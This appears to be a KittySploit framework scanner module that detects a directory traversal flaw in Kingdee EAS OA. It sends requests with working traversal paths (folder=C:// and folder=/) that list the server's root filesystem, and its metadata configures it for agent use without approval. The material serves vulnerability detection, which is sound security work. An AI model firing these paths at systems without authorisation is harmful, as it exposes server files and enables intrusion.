#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive s."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kingdee EAS - Local File Inclusion Detection',
        'description': 'Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'kingdee', 'lfi', 'traversal', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        for path in ('/appmonitor/protected/selector/server_file/files?folder=C://&suffix=', '/appmonitor/protected/selector/server_file/files?folder=/&suffix='):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('{"name":"Windows","path":"C:\\\\\\\\Windows","folder":true}', '{"name":"root","path":"/root","folder":true}',)
            header_any = ('application/json',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Kingdee EAS - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

